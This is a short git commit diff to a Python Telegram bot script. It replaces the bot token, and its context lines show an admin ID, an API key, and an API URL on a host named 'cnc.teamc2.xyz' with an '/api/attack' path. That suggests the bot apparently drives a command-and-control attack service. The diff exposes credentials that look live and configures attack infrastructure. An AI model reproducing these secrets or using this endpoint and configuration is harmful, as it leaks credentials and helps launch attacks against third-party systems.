affdf29889a80bbe2ec6a3913ae2f2042f31fa2a
monsterr0730 <bgmi83071@gmail.com>
2026-04-24 16:54:04 +0530

    Update bot (3).py

--- bot (3).py
+++ bot (3).py
@@ -12,7 +12,7 @@ from datetime import datetime, timedelta
 from collections import defaultdict
 
 # ========== CONFIG ==========
-BOT_TOKEN = "8760406918:AAHhsW-LvW5ZdDkRFGMCJ2EDL9YEiwuZCR8"
+BOT_TOKEN = "8760406918:AAFOIHhACXIb96Ytt2TGH5ZopfQr97pTBeg"
 ADMIN_ID = ["8487946379"]
 API_URL = "http://cnc.teamc2.xyz:5001/api/attack"
 API_KEY = "82XICX"
